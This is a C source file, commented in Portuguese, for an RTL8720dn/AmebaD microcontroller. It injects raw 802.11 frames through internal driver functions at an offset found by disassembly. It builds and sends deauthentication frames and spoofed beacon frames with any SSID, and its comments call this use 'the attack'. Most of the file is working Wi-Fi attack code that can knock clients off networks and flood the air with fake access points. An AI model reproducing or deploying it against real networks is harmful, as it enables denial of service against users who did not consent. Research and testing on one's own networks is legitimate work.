#include "packet-injection.h"

// Instancia global de telemetria
TxTelemetry tx_telemetry = {0, 0, 0, 0, 0, TX_SUCCESS, 0, 0};

void reset_tx_telemetry() {
  tx_telemetry.tx_attempted      = 0;
  tx_telemetry.tx_succeeded      = 0;
  tx_telemetry.tx_alloc_failures = 0;
  tx_telemetry.tx_dump_failures  = 0;
  tx_telemetry.tx_param_failures = 0;
  tx_telemetry.last_error_code   = TX_SUCCESS;
  tx_telemetry.last_dump_ret     = 0;
  tx_telemetry.last_fail_ms      = 0;
}

const char* tx_status_str(int status) {
  switch (status) {
    case TX_SUCCESS:            return "OK";
    case TX_ERR_INVALID_PARAM:  return "ERR_PARAM_INVALIDO";
    case TX_ERR_WLAN_INFO_NULL: return "ERR_WLAN_INFO_NULO";
    case TX_ERR_ADAPTER_NULL:   return "ERR_PADAPTER_NULO";
    case TX_ERR_ALLOC_FRAME:    return "ERR_FILA_TX_ESGOTADA(alloc_mgtxmitframe=NULL)";
    case TX_ERR_BUFFER_NULL:    return "ERR_PAYLOAD_BUF_NULO(+0x80=NULL)";
    case TX_ERR_DUMP_FAILED:    return "ERR_DUMP_MGNTFRAME_FALHOU";
    default:                    return "ERR_DESCONHECIDO";
  }
}

/*
 * Offset da fila de transmissao de frames de gerenciamento dentro de
 * struct _adapter (lib_wlan.a do AmebaD Arduino core).
 *
 * Valor confirmado por disassembly do core 3.1.9 instalado:
 *   arm-none-eabi-objdump -d rtw_mlme_ext.o
 * Todas as chamadas de alloc_mgtxmitframe() usam adapter + 0xa80:
 *   issue_deauth:   add.w r0, r0, #2688  ; 0xa80
 *   issue_beacon:   add.w r0, r5, #2688  ; 0xa80
 *   issue_probersp: add.w r0, r0, #2688  ; 0xa80
 *
 * ATENCAO: uma revisao anterior usou 0xae0 (0x60 bytes DEPOIS da fila
 * real). Nesse caso alloc_mgtxmitframe() nao devolve NULL — devolve um
 * ponteiro invalido — e o primeiro frame corrompe a memoria do driver:
 * o firmware reseta/trava no instante em que o ataque inicia, antes
 * mesmo de redesenhar a tela. Deauth e beacon quebram juntos porque
 * compartilham este caminho de TX.
 *
 * Se o core for trocado por uma versao com layout diferente, confirme o
 * offset no disassembly e sobrescreva via
 * build flag: -DMGMT_TX_QUEUE_OFFSET=0x...
 */
// ############################################################################
// #                                                                          #
// #   ☠  N A O   M E X A   N E S T E   V A L O R   ☠                        #
// #                                                                          #
// #   Isto NAO e um "numero magico" para ser ajustado no chute.              #
// #   0xa80 e o offset da fila mgnt_xmit dentro de struct _adapter,          #
// #   verificado no disassembly do core (3.1.9):                             #
// #       issue_deauth   -> add.w r0, r0, #2688                              #
// #       issue_beacon   -> add.w r5, r5, #2688                              #
// #       issue_probersp -> add.w r0, r0, #2688                              #
// #                                                                          #
// #   Se alguem "corrigir" para 0xae0 (ou qualquer outro valor):             #
// #   alloc_mgtxmitframe() devolve um ponteiro INVALIDO (nao NULL), o        #
// #   primeiro frame sobrescreve a memoria do driver, o chip RESETA e o      #
// #   ataque morre antes de desenhar a tela. Isso JA aconteceu uma vez e     #
// #   queimou horas de diagnostico — deauth e beacon caem juntos, e o log    #
// #   parece um problema de UI/tela quando na verdade e corrupcao de memoria.#
// #                                                                          #
// #   Mexeu? Vai quebrar. Nao existe "so um teste rapidinho".                #
// #   Precisa mesmo mudar? Confirme no binario do core com:                  #
// #       arm-none-eabi-objdump -d rtw_mlme_ext.o | grep 2688                #
// #   e sobrescreva apenas via build flag -DMGMT_TX_QUEUE_OFFSET=0x...,      #
// #   NUNCA editando este #define.                                           #
// #                                                                          #
// ############################################################################
#ifndef MGMT_TX_QUEUE_OFFSET
#define MGMT_TX_QUEUE_OFFSET 0xa80  // ☠ NAO TOQUE — ver o mural acima antes de "otimizar" ☠
#endif

/*
 * Transmite um quadro 802.11 cru com comprimento fornecido.
 * Retorna status TxStatus para deteccao de falhas do driver.
 */
int wifi_tx_raw_frame(const void* frame, size_t length) {
  tx_telemetry.tx_attempted++;

  // Limitador de taxa para evitar esgotar a fila TX do RTL8720dn (igual ao código original)
  static uint32_t last_tx_ms = 0;
  uint32_t now_ms = millis();
  if (last_tx_ms != 0 && (now_ms - last_tx_ms) < 8) {
    tx_telemetry.tx_alloc_failures++;
    tx_telemetry.last_error_code = TX_ERR_ALLOC_FRAME;
    tx_telemetry.last_fail_ms    = millis();
    return TX_ERR_ALLOC_FRAME;
  }
  last_tx_ms = now_ms;

  if (frame == NULL || length == 0 || length > 1500) {
    tx_telemetry.tx_param_failures++;
    tx_telemetry.last_error_code = TX_ERR_INVALID_PARAM;
    tx_telemetry.last_fail_ms    = millis();
    DEBUG_SER_PRINT("[TX-ERR] Frame ou tamanho invalido: ptr=");
    DEBUG_SER_PRINT((uint32_t)frame, HEX);
    DEBUG_SER_PRINT(" len=");
    DEBUG_SER_PRINT((uint32_t)length);
    DEBUG_SER_PRINT("\n");
    return TX_ERR_INVALID_PARAM;
  }

  if (rltk_wlan_info == NULL) {
    tx_telemetry.tx_param_failures++;
    tx_telemetry.last_error_code = TX_ERR_WLAN_INFO_NULL;
    tx_telemetry.last_fail_ms    = millis();
    DEBUG_SER_PRINT("[TX-ERR] rltk_wlan_info e NULL! Driver WiFi inativo.\n");
    return TX_ERR_WLAN_INFO_NULL;
  }

  uint32_t **wlan_info_slot = (uint32_t **)(rltk_wlan_info + 0x10);
  if (wlan_info_slot == NULL || *wlan_info_slot == NULL) {
    tx_telemetry.tx_param_failures++;
    tx_telemetry.last_error_code = TX_ERR_WLAN_INFO_NULL;
    tx_telemetry.last_fail_ms    = millis();
    DEBUG_SER_PRINT("[TX-ERR] *(rltk_wlan_info + 0x10) e NULL!\n");
    return TX_ERR_WLAN_INFO_NULL;
  }

  uint8_t *ptr = (uint8_t *)**wlan_info_slot;
  if (ptr == NULL) {
    tx_telemetry.tx_param_failures++;
    tx_telemetry.last_error_code = TX_ERR_ADAPTER_NULL;
    tx_telemetry.last_fail_ms    = millis();
    DEBUG_SER_PRINT("[TX-ERR] padapter (**slot) e NULL!\n");
    return TX_ERR_ADAPTER_NULL;
  }

  uint8_t *frame_control = (uint8_t *)alloc_mgtxmitframe(ptr + MGMT_TX_QUEUE_OFFSET);
  if (frame_control == NULL) {
    // Esgotamento de descritores no anel TX — causa mais frequente de crash/trava
    tx_telemetry.tx_alloc_failures++;
    tx_telemetry.last_error_code = TX_ERR_ALLOC_FRAME;
    tx_telemetry.last_fail_ms    = millis();
    return TX_ERR_ALLOC_FRAME;
  }

  uint32_t *payload_slot = (uint32_t *)(frame_control + 0x80);
  if (payload_slot == NULL || *payload_slot == 0) {
    // Se o buffer interno for nulo, memset(0) causaria ARM HardFault imediato
    tx_telemetry.tx_param_failures++;
    tx_telemetry.last_error_code = TX_ERR_BUFFER_NULL;
    tx_telemetry.last_fail_ms    = millis();
    DEBUG_SER_PRINT("[TX-ERR] Buffer payload (+0x80) e NULL! HardFault evitado.\n");
    return TX_ERR_BUFFER_NULL;
  }

  update_mgntframe_attrib(ptr, frame_control + 8);
  memset((void *)*payload_slot, 0, 0x68);

  uint8_t *frame_data = (uint8_t *)*payload_slot + 0x28;
  memcpy(frame_data, frame, length);
  *(uint32_t *)(frame_control + 0x14) = length;
  *(uint32_t *)(frame_control + 0x18) = length;

  int dump_ret = dump_mgntframe(ptr, frame_control);
  tx_telemetry.last_dump_ret = dump_ret;

  // Em firmwares RTL8720dn/Ameba, dump_mgntframe retorna 0 ou 1 em caso de sucesso.
  // Apenas valores negativos indicam um erro real do driver.
  if (dump_ret < 0) {
    tx_telemetry.tx_dump_failures++;
    tx_telemetry.last_error_code = TX_ERR_DUMP_FAILED;
    tx_telemetry.last_fail_ms    = millis();
    return TX_ERR_DUMP_FAILED;
  }

  tx_telemetry.tx_succeeded++;
  return TX_SUCCESS;
}

/*
 * Transmite um quadro de deautenticacao 802.11 no canal ativo
 */
int wifi_tx_deauth_frame(const void* src_mac, const void* dst_mac, uint16_t reason) {
  if (src_mac == NULL || dst_mac == NULL) {
    DEBUG_SER_PRINT("[DEAUTH-ERR] MAC nulo recebido em wifi_tx_deauth_frame!\n");
    return TX_ERR_INVALID_PARAM;
  }

  DeauthFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.sequence_number = 0;
  frame.reason = reason;

  return wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
}

/*
 * Transmite um beacon 802.11 com SSID no canal ativo
 */
int wifi_tx_beacon_frame(const void* src_mac, const void* dst_mac, const char *ssid) {
  if (src_mac == NULL || dst_mac == NULL || ssid == NULL) {
    DEBUG_SER_PRINT("[BEACON-ERR] Parametro nulo recebido em wifi_tx_beacon_frame!\n");
    return TX_ERR_INVALID_PARAM;
  }

  BeaconFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.sequence_number = 0;
  frame.ssid_length = 0;

  for (int i = 0; ssid[i] != '\0' && i < 255; i++) {
    frame.ssid[i] = (uint8_t)ssid[i];
    frame.ssid_length++;
  }

  return wifi_tx_raw_frame(&frame, 38 + frame.ssid_length);
}

